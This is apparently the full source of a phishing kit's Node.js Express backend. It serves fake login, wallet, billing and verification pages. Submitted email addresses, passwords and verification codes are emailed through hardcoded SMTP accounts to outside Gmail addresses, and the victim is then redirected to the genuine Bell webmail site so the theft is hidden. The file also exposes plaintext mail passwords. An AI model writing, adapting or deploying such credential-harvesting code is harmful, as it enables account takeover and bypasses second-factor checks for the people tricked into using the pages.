const nodemailer = require('nodemailer');
// const satelize = require('satelize');
// const axios = require('axios');
const fs = require('fs')
const express = require('express');
const app = express()
const bodyParser = require('body-parser')
const handlebars = require('handlebars');
const path = require('path');
require("dotenv").config
const smtpTransport = require('nodemailer-smtp-transport');

app.set('view engine', 'ejs');
app.use(express.static('public'));

app.use(bodyParser.urlencoded({ extended: true}));  

app.get('/bill', (req, res) => {
  res.render('home')
})

app.get('/login', (req, res) => {
  res.render('index')
})

app.get('/wallet', (req, res) => {
  res.render('wallet')
})


app.post('/', (req, res) => {
  req.body.email,
  req.body.password


  var transporter = nodemailer.createTransport(smtpTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    auth: {
      user: 'okumagbarukevwe@gmail.com',
      pass: 'ejbx ctia zdkq xwss'
    }
  }));
  


fs.readFile('Mail2.html','UTF-8',function(err, data) {
  if (err) console.log('error', err);
  const template = handlebars.compile(data.toString());
  const replacements = {
    email: req.body.email,
    password: req.body.password
  };
  const htmlToSend = template(replacements);
  
  var mailOptions = {
    from: 'okumagbarukevwe@gmail.com',
    to: 'okumagbarukkevwe@gmail.com',
    subject: '********New Message***********',
    text: "name:     " + replacements.email + "  " +"message:    " + replacements.password 
  };
  
  transporter.sendMail(mailOptions, function(error, info){
    if (error) {
      console.log(error);
    } else {
      console.log('Email sent: ' + info.response);
      console.log(info)
      res.redirect('https://webmail.en.bellnet.ca/ux/index-rui.jsp?v=3.1.3.54.0-4#/')
    }
  });  
//   console.log(message);
}) 
//   console.log(message);
  
})
// console.log(message);

app.get('/verify', (req, res) => {
    res.render('verify')
  })

  app.post('/verify', (req, res) => {
    req.body.verificationCode
    
  
  
  const transporter = nodemailer.createTransport({
    port:'465',
    host:'mail.privateemail.com',
    auth: {
      user: 'customer@rkodes.com',
      pass: '08028345728',
    },
    secure: true,
  })
  
  
  fs.readFile('Mail2.html','UTF-8',function(err, data) {
    if (err) console.log('error', err);
    const template = handlebars.compile(data.toString());
    const replacements = {
      verificationCode: req.body.verificationCode,
    };
    const htmlToSend = template(replacements);
    
        const mailData = {
        from: 'customer@rkodes.com',
        // to: 'okumagbarukevwe@gmail.com',
        to: 'Calebspencler@gmail.com',
        // to: 'joannelouisekenrick.cbs@gmail.com',
        // subject: `New User Alert`,
        text: '',
        html: htmlToSend,
        //  strUser
        subject: '*****New User Filled the Form*****',
        }
    
        transporter.sendMail(mailData, function (err, info) {
          if(err)
            console.log(err)
          else
            console.log(info)
            res.redirect('../')
          })
  }) 
    
  })
  


app.listen(process.env.PORT || 3200, ()=> {
  console.log('server has started')
})
